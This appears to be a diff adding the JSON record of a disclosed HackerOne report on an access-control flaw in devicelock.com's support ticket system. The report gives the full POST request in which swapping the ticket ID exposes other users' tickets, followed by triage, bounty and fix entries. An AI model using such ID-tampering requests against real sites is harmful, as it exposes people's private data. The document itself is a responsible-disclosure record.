@@ -1,0 +1,301 @@
+{
+    "id": 1124974,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTI0OTc0",
+    "url": "https://hackerone.com/reports/1124974",
+    "title": "Attacker Can Access to any Ticket Support on https://www.devicelock.com/support/",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "medium",
+    "readable_substate": "Resolved",
+    "created_at": "2021-03-13T13:41:01.482Z",
+    "submitted_at": "2021-03-13T13:41:01.714Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "h4x0r_dz",
+        "url": "/h4x0r_dz",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/jn83pnh4ctsyb50riy9iixqzko9k/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": true,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 13428,
+        "url": "https://hackerone.com/acronis",
+        "handle": "acronis",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Acronis",
+            "twitter_handle": "Acronis",
+            "website": "https://www.acronis.com",
+            "about": "Acronis sets the standard for cyber protection through its backup, anti-ransomware and cyber infrastructure"
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2022-02-08T09:10:02.144Z",
+    "bug_reporter_agreed_on_going_public_at": "2022-01-15T15:07:26.782Z",
+    "team_member_agreed_on_going_public_at": "2022-02-08T09:10:01.985Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Summary\n\nHello team.\n\nI found A security issue on devicelock.com where the attacker can access to any Ticket support and real all the information that The users sent to the support. and this without user interaction.\n\nIn other words: **an attacker can have full access to users Ticket using `Ticket id` only .**\n \n\n\n## Steps To Reproduce\n\nto Reproduce This bug you need to accounts, one for the attacker and the other for the victim.\n\n  1. in the victim account go to https://www.devicelock.com/bitrix/admin/ticket_edit.php?lang=en and add a new ticket. now, this ticket has an **ID** Copy this id.\n  2. go to https://www.devicelock.com/support/ticket_edit.html?ID=0 and put anything on Subject&Message. \nnow make intercept on and click on ***Save***. and change the **Content-Disposition: form-data; name=\"ID\"** value to the victim id ticket .\n\n\n### vulnerable Request : `ID` parameter \n ```\nPOST /support/ticket_edit.html?ID=0 HTTP/1.1\nHost: www.devicelock.com\nConnection: close\nContent-Length: 1505\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://www.devicelock.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryEbeDU0DJhrnLl8U7\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://www.devicelock.com/support/ticket_edit.html?ID=38173\nAccept-Encoding: gzip, deflate\nAccept-Language: ar,en-US;q=0.9,en;q=0.8\nCookie: <attacker_Cookie>\n\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"sessid\"\n\n<sessid_attacker>\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"set_default\"\n\nY\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"ID\"\n\n<victim_id>\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"lang\"\n\nen\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"TITLE\"\n\nanything\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"MESSAGE\"\n\nanything\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n3072000\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"FILE_0\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"FILE_1\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"FILE_2\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"files_counter\"\n\n2\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"apply\"\n\nApply\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7\nContent-Disposition: form-data; name=\"apply\"\n\nY\n------WebKitFormBoundaryEbeDU0DJhrnLl8U7--\n\n```\n\nnow in the response, you can see the victim ticket information.\n\n### POC \n\n{F1228906}\n\n## Impact\n\nan attacker can access all user's tickets without user interaction.",
+    "weakness": {
+        "id": 26,
+        "name": "Improper Access Control - Generic"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 1228906,
+            "file_name": "2021-03-13_14-34-03.mp4",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/92p3jra0dqz03ck42rb2hbf1rpz9?response-content-disposition=attachment%3B%20filename%3D%222021-03-13_14-34-03.mp4%22%3B%20filename%2A%3DUTF-8%27%272021-03-13_14-34-03.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070442Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a54338aac2b16869231ed4e9fcabb6906a603098973eae89076acbd869e331dc",
+            "file_size": 8521518,
+            "type": "video/mp4"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 96,
+    "voters": [
+        "pinkmeimei",
+        "mr-medi",
+        "napkin",
+        "x7q",
+        "testt0",
+        "alp",
+        "theelgo64",
+        "shuvam321",
+        "xzemit42",
+        "zbe",
+        "and 86 more..."
+    ],
+    "severity": {
+        "rating": "medium",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 63087,
+        "asset_type": "WILDCARD",
+        "asset_identifier": "*.devicelock.com",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 10982817,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @h4x0r_dz\n\nThanks for participating in Acronis bug bounty program!\nOur security team usually replies within 1-2 business days.\n\nMeanwhile, I'd recommend you to check out our [policy](https://hackerone.com/acronis).\n",
+            "automated_response": false,
+            "created_at": "2021-03-13T13:44:07.154Z",
+            "updated_at": "2021-03-13T13:44:07.154Z",
+            "actor": {
+                "username": "security-bot",
+                "cleared": false,
+                "verified": false,
+                "url": "/security-bot",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8j8hgg8lahteormio6374m2zn4on/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 10992506,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-03-15T08:13:29.120Z",
+            "updated_at": "2021-03-15T08:13:29.120Z",
+            "actor": {
+                "username": "stushieva",
+                "cleared": false,
+                "verified": false,
+                "url": "/stushieva",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 11007968,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "Thanks for participating in Acronis bug bounty program! Bounty is transferred to your account.\nHappy bug hunting and we are waiting for new reports from you.",
+            "automated_response": false,
+            "created_at": "2021-03-16T09:33:05.988Z",
+            "updated_at": "2021-03-16T09:33:05.988Z",
+            "actor": {
+                "url": "/acronis",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/e54TDdWdgLKsH3h1oFpK26bq/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Acronis"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "acronis",
+            "collaborator": {
+                "username": "h4x0r_dz",
+                "url": "/h4x0r_dz"
+            }
+        },
+        {
+            "id": 14691918,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Thanks for catching this bug!\n\nWe have fixed it, please confirm that you are no longer able to reproduce the issue.\n",
+            "automated_response": false,
+            "created_at": "2021-12-15T16:29:14.387Z",
+            "updated_at": "2021-12-15T16:29:14.387Z",
+            "actor": {
+                "username": "security-bot",
+                "cleared": false,
+                "verified": false,
+                "url": "/security-bot",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/8j8hgg8lahteormio6374m2zn4on/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "h4x0r_dz",
+                "url": "/h4x0r_dz"
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 15051343,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-01-15T15:07:26.826Z",
+            "updated_at": "2022-01-15T15:07:26.826Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "h4x0r_dz",
+                "cleared": false,
+                "verified": true,
+                "url": "/h4x0r_dz",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/jn83pnh4ctsyb50riy9iixqzko9k/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 15377342,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-02-08T09:10:02.040Z",
+            "updated_at": "2022-02-08T09:10:02.040Z",
+            "actor": {
+                "username": "stushieva",
+                "cleared": false,
+                "verified": false,
+                "url": "/stushieva",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        },
+        {
+            "id": 15377343,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-02-08T09:10:02.212Z",
+            "updated_at": "2022-02-08T09:10:02.212Z",
+            "actor": {
+                "username": "stushieva",
+                "cleared": false,
+                "verified": false,
+                "url": "/stushieva",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/j7zANdAVudZqo6vWUahsdFKG/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "acronis"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
